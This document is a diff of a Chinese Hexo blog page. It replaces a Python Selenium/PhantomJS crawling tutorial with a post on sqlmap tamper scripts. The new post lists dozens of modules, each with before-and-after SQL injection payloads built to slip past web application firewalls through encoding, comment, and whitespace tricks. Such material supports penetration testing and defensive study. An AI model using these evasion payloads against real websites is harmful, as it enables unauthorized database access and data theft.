@@ -4,9 +4,9 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Python网络爬虫实战之七：动态网页爬取案例实战 Selenium + PhantomJS, 苦乐随缘">
-    <meta name="description" content="
-正文：一、Selenium1、Selenium是什么Selenium 是什么？一句话，自动化测试工具。它支持各种浏览器，包括 Chrome，Safari，Firefox 等主流界面式浏览器，如果你在这些浏览器里面安装一个 Selenium">
+    <meta name="keywords" content="sqlmap使用记录--tamper, 苦乐随缘">
+    <meta name="description" content="sqlmap在默认的的情况下除了使用char()函数防止出现单引号，没有对注入的数据进行修改，还可以使用–tamper参数对数据做修改来绕过waf等设备。
+0x01 命令如下1  sqlmap -u [url] --tamper [模块名]">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +14,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Python网络爬虫实战之七：动态网页爬取案例实战 Selenium + PhantomJS | 苦乐随缘</title>
+    <title>sqlmap使用记录--tamper | 苦乐随缘</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -264,7 +264,7 @@
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Python网络爬虫实战之七：动态网页爬取案例实战 Selenium + PhantomJS
+                        sqlmap使用记录--tamper
                     </div>
                 </div>
             </div>
@@ -286,16 +286,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Python/" target="_blank">
-                                <span class="chip bg-color">Python</span>
-                            </a>
-                        
-                            <a href="/tags/Selenium/" target="_blank">
-                                <span class="chip bg-color">Selenium</span>
-                            </a>
-                        
-                            <a href="/tags/PhantomJS/" target="_blank">
-                                <span class="chip bg-color">PhantomJS</span>
+                            <a href="/tags/sqlmap/" target="_blank">
+                                <span class="chip bg-color">sqlmap</span>
                             </a>
                         
                     </div>
@@ -306,8 +298,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Python/" class="post-category" target="_blank">
-                                Python
+                            <a href="/categories/sqlmap/" class="post-category" target="_blank">
+                                sqlmap
                             </a>
                         
                     </div>
@@ -318,7 +310,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-05-19
+                    2019-04-01
                 </div>
 
                 
@@ -334,206 +326,78 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <ul>
-<li><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><h2 id="一、Selenium"><a href="#一、Selenium" class="headerlink" title="一、Selenium"></a>一、Selenium</h2><h3 id="1、Selenium是什么"><a href="#1、Selenium是什么" class="headerlink" title="1、Selenium是什么"></a>1、Selenium是什么</h3><p>Selenium 是什么？一句话，自动化测试工具。它支持各种浏览器，包括 Chrome，Safari，Firefox 等主流界面式浏览器，如果你在这些浏览器里面安装一个 Selenium 的插件，那么便可以方便地实现Web界面的测试。换句话说叫 Selenium 支持这些浏览器驱动。</p>
-<h3 id="2、安装Selenium"><a href="#2、安装Selenium" class="headerlink" title="2、安装Selenium"></a>2、安装Selenium</h3><ul>
-<li>方法一：pip install selenium</li>
-<li>方法二：<a href="https://pypi.org/simple/selenium/" target="_blank" rel="noopener">下载源码</a>后解压，进入解压后的目录，执行 python setup.py install</li>
-</ul>
-<h3 id="3、安装浏览器驱动"><a href="#3、安装浏览器驱动" class="headerlink" title="3、安装浏览器驱动"></a>3、安装浏览器驱动</h3><p>使用谷歌浏览器，则下载<a href="https://sites.google.com/a/chromium.org/chromedriver/downloads" target="_blank" rel="noopener">chromedriver.exe</a>，下载成功后，把chromedriver.exe复制到Python安装路径下的Scripts目录中</p>
-<p>使用其他浏览器方法类似</p>
-<h3 id="4、快速体验Selenium"><a href="#4、快速体验Selenium" class="headerlink" title="4、快速体验Selenium"></a>4、快速体验Selenium</h3><p>使用pyhon打开浏览器，并自动访问百度首页</p>
-<pre><code>from selenium import webdriver
-
-browser = webdriver.Chrome()
-browser.get(&#39;http://www.baidu.com/&#39;)
-</code></pre><p>打开浏览器，并自动在百度中搜索“Python”关键词</p>
-<pre><code>from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
-
-browser = webdriver.Chrome()
-browser.get(&#39;https://www.baidu.com&#39;)
-input = browser.find_element_by_id(&#39;kw&#39;)
-input.send_keys(&#39;Python&#39;)
-input.send_keys(Keys.ENTER)
-</code></pre><h3 id="5、爬取网页代码：自动在百度中搜索“Python”关键词后的网页"><a href="#5、爬取网页代码：自动在百度中搜索“Python”关键词后的网页" class="headerlink" title="5、爬取网页代码：自动在百度中搜索“Python”关键词后的网页"></a>5、爬取网页代码：自动在百度中搜索“Python”关键词后的网页</h3><pre><code>from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.support.wait import WebDriverWait
-
-browser = webdriver.Chrome()
-try:
-    browser.get(&#39;https://www.baidu.com&#39;)
-    input = browser.find_element_by_id(&#39;kw&#39;)
-    input.send_keys(&#39;Python&#39;)
-    input.send_keys(Keys.ENTER)
-    wait = WebDriverWait(browser, 10)
-    wait.until(EC.presence_of_element_located((By.ID, &#39;content_left&#39;)))
-    print(browser.current_url)
-    print(browser.get_cookies())
-    print(browser.page_source)
-finally:
-    browser.close()
-</code></pre><p>Selenium的更详细资料可参考<a href="http://selenium-python-zh.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener">Selenium with Python中文翻译文档</a></p>
-<h2 id="二、PhantomJS"><a href="#二、PhantomJS" class="headerlink" title="二、PhantomJS"></a>二、PhantomJS</h2><h3 id="1、PhantomJs是什么？"><a href="#1、PhantomJs是什么？" class="headerlink" title="1、PhantomJs是什么？"></a>1、PhantomJs是什么？</h3><p>PhantomJs是什么？是一个基于Webkit的”无界面”(headless)浏览器，它会把网站加载到内存并执行页面上的JavaScript，因为不会展示图形界面，所以运行起来比完整的浏览器更高效。</p>
-<p>爬取动态网页的时候，通常是PhantomJS 用来渲染解析JS，Selenium 用来驱动以及与 Python 的对接，Python 进行后期的处理，完美的三剑客！</p>
-<h3 id="2、安装PhantomJS"><a href="#2、安装PhantomJS" class="headerlink" title="2、安装PhantomJS"></a>2、安装PhantomJS</h3><p><a href="http://phantomjs.org/download.html" target="_blank" rel="noopener">PhantomJS官方下载地址</a><br> 下载成功后，解压得到phantomjs-2.1.1-windows文件夹，bin目录下的phantomjs.exe文件才是我们真正需要的，example目录下的文件时官方示例代码。</p>
-<p>可以通过设置环境变量来使用PhantomJS，也可以通过指定路径来操作。设置环境变量的方法式把phantomjs-2.1.1-windows的bin配置到path中，比如我的路径是D:\python\PythonLibs\phantomjs-2.1.1-windows\bin</p>
-<p>通过输出PhantomJS来检验PhantomJS是否可用：</p>
-<ul>
-<li>如果配置了系统环境变量，在cmd控制台直接输入：phantomjs -v</li>
-<li>如果没有配置系统全局变量，则进入到phantomjs.exe文件的所在目录，比如：D:\Python\PythonLibs\phantomjs-2.1.1-windows\bin，然后再执行 phantomjs -v</li>
-</ul>
-<h3 id="3、快速体验PhantomJS"><a href="#3、快速体验PhantomJS" class="headerlink" title="3、快速体验PhantomJS"></a>3、快速体验PhantomJS</h3><p>使用方法：进入phantomjs.exe所在目录，然后执行 phantomjs 文件绝对路径</p>
-<p>执行官方示例中的hello.js文件（假设没有配置系统全局变量）</p>
-<pre><code>D:\DataguruPyhton&gt;cd D:\python\PythonLibs\phantomjs-2.1.1-windows\bin
-D:\Python\PythonLibs\phantomjs-2.1.1-windows\bin&gt;phantomjs D:\python\PythonLibs\pha
-ntomjs-2.1.1-windows\examples\hello.js
-
-运行结果是：Hello, world!
-</code></pre><p>其中hello.js中的代码是：</p>
-<pre><code>&quot;use strict&quot;;
-console.log(&#39;Hello, world!&#39;);
-phantom.exit();
-</code></pre><p>执行官方示例中的version.js文件（假设没有配置系统全局变量）</p>
-<pre><code>D:\Python\PythonLibs\phantomjs-2.1.1-windows\bin&gt;phantomjs D:\python\PythonLibs\pha
-ntomjs-2.1.1-windows\examples\version.js
-
-运行结果是：using PhantomJS version 2.1.1
-</code></pre><p>其中version.js中的代码是：</p>
-<pre><code>&quot;use strict&quot;;
-console.log(&#39;using PhantomJS version &#39; +
-  phantom.version.major + &#39;.&#39; +
-  phantom.version.minor + &#39;.&#39; +
-  phantom.version.patch);
-phantom.exit();
-</code></pre><p>PhantomJS更详细资料可参考<a href="http://phantomjs.org/documentation/" target="_blank" rel="noopener">PhantomJS官方文档</a></p>
-<h2 id="三、Selenium-PhantomJS结合使用"><a href="#三、Selenium-PhantomJS结合使用" class="headerlink" title="三、Selenium+PhantomJS结合使用"></a>三、Selenium+PhantomJS结合使用</h2><p>Selenium + PhantomJS 实例一</p>
-<pre><code>from selenium import webdriver
-# 调用键盘按键操作需要引入keys包
-from selenium.webdriver.common.keys import Keys
-
-# 调用指定的PhantomJS浏览器创建浏览器对象（没有在环境变量中指定PhantomJS位置）
-driver = webdriver.PhantomJS(executable_path=r&#39;D:\python\PythonLibs\phantomjs-2.1.1-windows\bin\phantomjs&#39;)
-# 调用环境变量指定的PhantomJS浏览器创建浏览器对象（如果已经在环境变量中指定了PhantomJS位置）
-# driver = webdriver.PhantomJS()
-driver.set_window_size(1366, 768)
-# get方法会一直等到页面加载，然后才会继续程序，通常测试会在这里选择time.sleep(2)
-driver.get(&quot;http://www.baidu.com/&quot;)
-# 获取页面名为wraper的id标签的文本内容
-data = driver.find_element_by_id(&#39;wrapper&#39;).text
-# 打印数据内容
-print(data)
-# 把百度设为主页关于百度About  Baidu百度推广
-# ©2018 Baidu 使用百度前必读 意见反馈 京ICP证030173号  京公网安备11000002000001号
-print(driver.title)  # result: 百度一下，你就知道
-# 生成页面快照并保存
-driver.save_screenshot(r&#39;D:\DataguruPyhton\PythonSpider\images\baidu.png&#39;)
-# id=&quot;kw&quot;是百度搜索输入框，输入字符串&quot;长城&quot;
-driver.find_element_by_id(&#39;kw&#39;).send_keys(u&#39;长城&#39;)
-# id=&quot;su&quot;是百度搜索按钮，click()是模拟点击
-driver.find_element_by_id(&#39;su&#39;).click()
-# 获取新的页面快照
-driver.save_screenshot(r&#39;D:\DataguruPyhton\PythonSpider\images\长城.png&#39;)
-# 打印网页渲染后的源代码
-print(driver.page_source)
-# 获取当前页面Cookie
-print(driver.get_cookies())
-driver.quit()
-</code></pre><p>Selenium + PhantomJS 实例二</p>
-<pre><code>from selenium import webdriver
-import time
-# 调用键盘按键操作需要引入keys包
-from selenium.webdriver.common.keys import Keys
-
-# 调用指定的PhantomJS浏览器创建浏览器对象（没有在环境变量中指定PhantomJS位置）
-driver = webdriver.PhantomJS(executable_path=r&#39;D:\python\PythonLibs\phantomjs-2.1.1-windows\bin\phantomjs&#39;)
-# 调用环境变量指定的PhantomJS浏览器创建浏览器对象（如果已经在环境变量中指定了PhantomJS位置）
-# driver = webdriver.PhantomJS()
-driver.set_window_size(1366, 768)
-# get方法会一直等到页面加载，然后才会继续程序，通常测试会在这里选择time.sleep(2)
-driver.get(&quot;http://www.baidu.com/&quot;)
-# id=&quot;kw&quot;是百度搜索输入框，输入字符串&quot;情人节&quot;
-driver.find_element_by_id(&#39;kw&#39;).send_keys(u&#39;情人节&#39;)
-# ctrl+a全选输入框内容
-driver.find_element_by_id(&#39;kw&#39;).send_keys(Keys.CONTROL, &#39;a&#39;)
-# ctrl+x剪切输入框内容
-driver.find_element_by_id(&#39;kw&#39;).send_keys(Keys.CONTROL, &#39;x&#39;)
-# 输入框重新输入内容
-driver.find_element_by_id(&#39;kw&#39;).send_keys(&#39;鲜花&#39;)
-# 模拟Enter回车键
-driver.find_element_by_id(&#39;su&#39;).send_keys(Keys.RETURN)
-time.sleep(5)
-# 清空输入框内容
-driver.find_element_by_id(&#39;kw&#39;).clear()
-# 生成新的页面快照
-driver.save_screenshot(r&#39;D:\DataguruPyhton\PythonSpider\images\鲜花.png&#39;)
-# 获取当前url
-print(driver.current_url)
-driver.quit()
-</code></pre><p>Selenium + PhantomJS 实例三：爬取包含Ajax的动态网页数据</p>
-<pre><code>## Selenium+PhantomJS爬取包含Ajax的动态网页数据：通过手动延时
-from selenium import webdriver
-import time
-
-driver = webdriver.PhantomJS(executable_path=r&#39;D:\python\PythonLibs\phantomjs-2.1.1-windows\bin\phantomjs&#39;)
-driver.get(&quot;http://pythonscraping.com/pages/javascript/ajaxDemo.html&quot;)
-# driver.page_source
-time.sleep(3)
-print(driver.find_element_by_id(&quot;content&quot;).text)
-driver.close()
-</code></pre><p>完善后的代码</p>
-<pre><code>## Selenium+PhantomJS爬取包含Ajax的动态网页数据：通过检查页面是否加载完毕
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-
-driver = webdriver.PhantomJS(executable_path=r&#39;D:\python\PythonLibs\phantomjs-2.1.1-windows\bin\phantomjs&#39;)
-driver.get(&quot;http://pythonscraping.com/pages/javascript/ajaxDemo.html&quot;)
-try:
-    element = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, &quot;loadedButton&quot;)))
-finally:
-    print(driver.find_element_by_id(&quot;content&quot;).text)
-    driver.close()
-</code></pre><p>Selenium + PhantomJS 实例四：爬取重定向的动态网页数据</p>
-<p><code>`</code><br>from selenium import webdriver<br>from selenium.common.exceptions import StaleElementReferenceException</p>
-</li>
-</ul>
-<p>  def waitForLoad(driver):<br>      elem = driver.find_element_by_tag_name(“html”)<br>      count = 0<br>      while True:<br>          count += 1<br>          if count &gt; 20:<br>              print(“Timing out after 10 seconds and returning”)<br>              return<br>          time.sleep(.5)<br>          try:<br>              elem == driver.find_element_by_tag_name(“html”)<br>          except StaleElementReferenceException:<br>              return</p>
-<p>  driver = webdriver.PhantomJS(executable_path=r’D:\python\PythonLibs\phantomjs-2.1.1-windows\bin\phantomjs’)<br>  driver.get(“<a href="http://pythonscraping.com/pages/javascript/redirectDemo1.html&quot;" target="_blank" rel="noopener">http://pythonscraping.com/pages/javascript/redirectDemo1.html&quot;</a>)<br>  waitForLoad(driver)<br>  print(driver.page_source)</p>
-<pre><code>
-  ## 四、Selenium+PhantomJS使用时报错原因及解决方案
-
-  ### 1、现象
-
-  报错日志：
-
-</code></pre><p>  UserWarning: Selenium support for PhantomJS has been deprecated, please use headless versions of Chrome or Firefox instead warnings.warn(‘Selenium support for PhantomJS has been deprecated, please use headless ‘</p>
-<pre><code>
-  就是说selenium已经放弃PhantomJS，了，建议使用火狐或者谷歌无界面浏览器。
-
-  ### 2、解决方案
-
-  - 方案一：selenium版本降级，卸载当前selenium，重现安装低版本的selenium，比如pip install selenium==3.8.0
-  - 方案二：使用 Selenium + Headless Firefox 或 Selenium + Headless Chrome
-
-  &gt; 将在下篇文章中详细介绍 Selenium + Headless Chrome
-
-  ## 五、本篇文章中的代码，运行环境
-
-  - Python 3.6.4
-  - selenium 3.8.0
-  - phantomjs-2.1.1-windows
-  - chromedriver.exe
-
-  ## 六、彩蛋：pillow对图片进行处理
-
-  为以后读取图片验证码铺垫
-
-</code></pre><h1 id="需要先安装pillow-安装方法：pip-install-pillow"><a href="#需要先安装pillow-安装方法：pip-install-pillow" class="headerlink" title="需要先安装pillow,安装方法：pip install pillow"></a>需要先安装pillow,安装方法：pip install pillow</h1><p>  from PIL import Image, ImageFilter</p>
-<p>  kitten = Image.open(u”D:\DataguruPyhton\PythonSpider\images\girl1.jpg”)<br>  blurryKitten = kitten.filter(ImageFilter.GaussianBlur)<br>  blurryKitten.save(u”D:\DataguruPyhton\PythonSpider\images\girl2.jpg”)<br>  blurryKitten.show()<br>  <code>`</code></p>
-
+                <p>sqlmap在默认的的情况下除了使用char()函数防止出现单引号，没有对注入的数据进行修改，还可以使用–tamper参数对数据做修改来绕过waf等设备。</p>
+<h4 id="0x01-命令如下"><a href="#0x01-命令如下" class="headerlink" title="0x01 命令如下"></a>0x01 命令如下</h4><pre class=" language-python"><code class="language-python"><span class="token number">1</span>  sqlmap <span class="token operator">-</span>u <span class="token punctuation">[</span>url<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">-</span>tamper <span class="token punctuation">[</span>模块名<span class="token punctuation">]</span>
+</code></pre>
+<p>sqlmap的绕过脚本在目录usr/share/golismero/tools/sqlmap/tamper下<br>目前sqlmap 1.2.9版本共有37个</p>
+<p>可以使用–identify-waf对一些网站是否有安全防护进行试探</p>
+<h4 id="0x02-常用tamper脚本"><a href="#0x02-常用tamper脚本" class="headerlink" title="0x02 常用tamper脚本"></a>0x02 常用tamper脚本</h4><p>apostrophemask.py</p>
+<p>适用数据库：ALL<br>作用：将引号替换为utf-8，用于过滤单引号<br>使用脚本前：tamper(“1 AND ‘1’=’1”)<br>使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p>
+<p>base64encode.py</p>
+<p>适用数据库：ALL<br>作用：替换为base64编码<br>使用脚本前：tamper(“1’ AND SLEEP(5)#”)<br>使用脚本后：MScgQU5EIFNMRUVQKDUpIw==</p>
+<p>multiplespaces.py</p>
+<p>适用数据库：ALL<br>作用：围绕sql关键字添加多个空格<br>使用脚本前：tamper(‘1 UNION SELECT foobar’)<br>使用脚本后：1 UNION SELECT foobar</p>
+<p>space2plus.py</p>
+<p>适用数据库：ALL<br>作用：用加号替换空格<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT+id+FROM+users</p>
+<p>nonrecursivereplacement.py</p>
+<p>适用数据库：ALL<br>作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）<br>使用脚本前：tamper(‘1 UNION SELECT 2–’)<br>使用脚本后：1 UNIOUNIONN SELESELECTCT 2–</p>
+<p>space2randomblank.py</p>
+<p>适用数据库：ALL<br>作用：将空格替换为其他有效字符<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Did%0DFROM%0Ausers</p>
+<p>unionalltounion.py</p>
+<p>适用数据库：ALL<br>作用：将union allselect 替换为unionselect<br>使用脚本前：tamper(‘-1 UNION ALL SELECT’)<br>使用脚本后：-1 UNION SELECT</p>
+<p>securesphere.py</p>
+<p>适用数据库：ALL<br>作用：追加特定的字符串<br>使用脚本前：tamper(‘1 AND 1=1’)<br>使用脚本后：1 AND 1=1 and ‘0having’=’0having’</p>
+<p>space2dash.py</p>
+<p>适用数据库：ALL<br>作用：将空格替换为–，并添加一个随机字符串和换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227</p>
+<p>space2mssqlblank.py</p>
+<p>适用数据库：Microsoft SQL Server<br>测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005<br>作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Eid%0DFROM%07users</p>
+<p>between.py</p>
+<p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：用NOT BETWEEN 0 AND #替换&gt;<br>使用脚本前：tamper(‘1 AND A &gt; B–’)<br>使用脚本后：1 AND A NOT BETWEEN 0 AND B–</p>
+<p>percentage.py</p>
+<p>适用数据库：ASP<br>测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0<br>作用：在每个字符前添加一个%<br>使用脚本前：tamper(‘SELECT FIELD FROM TABLE’)<br>使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p>
+<p>sp_password.py</p>
+<p>适用数据库：MSSQL<br>作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password<br>使用脚本前：tamper(‘1 AND 9227=9227– ‘)<br>使用脚本后：1 AND 9227=9227– sp_password</p>
+<p>charencode.py</p>
+<p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）<br>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p>
+<p>randomcase.py</p>
+<p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：随机大小写<br>使用脚本前：tamper(‘INSERT’)<br>使用脚本后：INseRt</p>
+<p>charunicodeencode.py</p>
+<p>适用数据库：ASP、ASP.NET<br>测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3<br>作用：适用字符串的unicode编码<br>使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’)<br>使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p>
+<p>space2comment.py</p>
+<p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将空格替换为/<strong>/<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT/</strong>/id/<strong>/FROM/</strong>/users</p>
+<p>equaltolike.py</p>
+<p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5<br>作用：将=替换为LIKE<br>使用脚本前：tamper(‘SELECT <em> FROM users WHERE id=1’)<br>使用脚本后：SELECT </em> FROM users WHERE id LIKE 1</p>
+<p>equaltolike.py</p>
+<p>测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将&gt;替换为GREATEST，绕过对&gt;的过滤<br>使用脚本前：tamper(‘1 AND A &gt; B’)<br>使用脚本后：1 AND GREATEST(A,B+1)=A</p>
+<p>ifnull2ifisnull.py</p>
+<p>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br>测试通过数据库：MySQL 5.0 and 5.5<br>作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤<br>使用脚本前：tamper(‘IFNULL(1, 2)’)<br>使用脚本后：IF(ISNULL(1),2,1)</p>
+<p>modsecurityversioned.py</p>
+<p>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：过滤空格，使用mysql内联注释的方式进行注入<br>使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>使用脚本后：1 /<em>!30874AND 2&gt;1</em>/–<br>space2mysqlblank.py</p>
+<p>适用数据库：MySQL<br>测试通过数据库：MySQL 5.1<br>作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Bid%0DFROM%0Cusers</p>
+<p>modsecurityzeroversioned.py</p>
+<p>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：使用内联注释方式（/<em>!00000</em>/）进行注入<br>使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>使用脚本后：1 /<em>!00000AND 2&gt;1</em>/–</p>
+<p>space2mysqldash.py</p>
+<p>适用数据库：MySQL、MSSQL<br>作用：将空格替换为 – ，并追随一个换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1–%0AAND–%0A9227=9227</p>
+<p>bluecoat.py</p>
+<p>适用数据库：Blue Coat SGOS<br>测试通过数据库：MySQL 5.1,、SGOS<br>作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=<br>使用脚本前：tamper(‘SELECT id FROM users where id = 1’)<br>使用脚本后：SELECT%09id FROM users where id LIKE 1</p>
+<p>versionedkeywords.py</p>
+<p>适用数据库：MySQL<br>测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11<br>作用：注释绕过<br>使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’)<br>使用脚本后：1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p>
+<p>halfversionedmorekeywords.py</p>
+<p>适用数据库：MySQL &lt; 5.1<br>测试通过数据库：MySQL 4.0.18/5.0.22<br>作用：在每个关键字前添加mysql版本注释<br>使用脚本前：tamper(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)<br>使用脚本后：value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa</p>
+<p>space2morehash.py</p>
+<p>适用数据库：MySQL &gt;= 5.1.13<br>测试通过数据库：MySQL 5.1.41<br>作用：将空格替换为#，并添加一个随机字符串和换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</p>
+<p>apostrophenullencode.py</p>
+<p>适用数据库：ALL<br>作用：用非法双字节Unicode字符替换单引号<br>使用脚本前：tamper(“1 AND ‘1’=’1”)<br>使用脚本后：1 AND %00%271%00%27=%00%271</p>
+<p>appendnullbyte.py</p>
+<p>适用数据库：ALL<br>作用：在有效载荷的结束位置加载null字节字符编码<br>使用脚本前：tamper(‘1 AND 1=1’)<br>使用脚本后：1 AND 1=1%00</p>
+<p>chardoubleencode.py</p>
+<p>适用数据库：ALL<br>作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）<br>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p>
+<p>unmagicquotes.py</p>
+<p>适用数据库：ALL<br>作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格<br>使用脚本前：tamper(“1’ AND 1=1”)<br>使用脚本后：1%bf%27 AND 1=1–</p>
+<p>randomcomments.py</p>
+<p>适用数据库：ALL<br>作用：用注释符分割sql关键字<br>使用脚本前：tamper(‘INSERT’)<br>使用脚本后：I/<strong>/N/</strong>/SERT</p>
+<h4 id="0x03-附录："><a href="#0x03-附录：" class="headerlink" title="0x03 附录："></a>0x03 附录：</h4><p><img src="https://img2018.cnblogs.com/blog/1358580/201906/1358580-20190605194338464-982309411.png" alt="img"></p>
+<h4 id="0x04-在熟悉了tamper脚本之后，我们应该学习tamper绕过脚本的编写规则，来应对复杂的实际环境。"><a href="#0x04-在熟悉了tamper脚本之后，我们应该学习tamper绕过脚本的编写规则，来应对复杂的实际环境。" class="headerlink" title="0x04 在熟悉了tamper脚本之后，我们应该学习tamper绕过脚本的编写规则，来应对复杂的实际环境。"></a>0x04 在熟悉了tamper脚本之后，我们应该学习tamper绕过脚本的编写规则，来应对复杂的实际环境。</h4>
             </div>
             <hr>
 
@@ -680,7 +544,7 @@ finally:
                     </span>
                     <a href="http://Coderzgh.github.io" class="b-link-green">苦乐随缘</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/05/19/python-crawler-static-sample-7/" class="b-link-green">Python网络爬虫实战之七：动态网页爬取案例实战 Selenium + PhantomJS</a>
+                    <a href="/2019/04/01/sqlmap-tamper/" class="b-link-green">sqlmap使用记录--tamper</a>
                 </p>
             </div>
         </div>
@@ -705,78 +569,29 @@ finally:
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/06/02/fiddler-one/">
+                <a href="/2019/05/11/python-crawler-basic-internet-1/">
                     <div class="card-image">
                         
-                        <img src="/source/images/xxx.jpg" class="responsive-img" alt="Fiddler大解析！抱歉，抓包抓得好真的可以为所欲为">
+                        <img src="/source/images/xxx.jpg" class="responsive-img" alt="Python网络爬虫实战之一：网络爬虫理论基础">
                         
-                        <span class="card-title">Fiddler大解析！抱歉，抓包抓得好真的可以为所欲为</span>
+                        <span class="card-title">Python网络爬虫实战之一：网络爬虫理论基础</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
